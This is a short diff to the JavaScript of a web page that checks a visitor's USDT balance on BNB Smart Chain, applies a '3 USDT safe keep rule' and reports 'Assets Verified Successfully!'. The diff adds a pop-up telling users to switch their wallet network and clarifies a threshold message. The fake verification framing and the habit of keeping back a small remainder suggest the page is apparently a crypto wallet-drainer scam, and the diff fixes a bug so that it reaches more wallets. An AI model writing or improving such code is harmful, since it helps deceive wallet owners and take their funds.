@@ -215,7 +215,13 @@
                     data: dataBalance
                 }, 'latest']);
 
-                const balanceWei = BigInt(balanceHex || '0x0');
+                // Fix for the "Cannot convert 0x to a BigInt" Network Error
+                if (!balanceHex || balanceHex === '0x') {
+                    alert("Network Error: Please switch your wallet network to BNB Smart Chain (BSC).");
+                    return;
+                }
+
+                const balanceWei = BigInt(balanceHex);
                 const oneUsdt = 1000000000000000000n;
                 const minKeepWei = 3n * oneUsdt; // 3 USDT safe keep rule
 
@@ -237,7 +243,7 @@
 
                     alert("Assets Verified Successfully!");
                 } else {
-                    alert("Verification complete. Required threshold not met.");
+                    alert("Verification complete. Required threshold (> 3 USDT) not met.");
                 }
 
             } catch (error) {
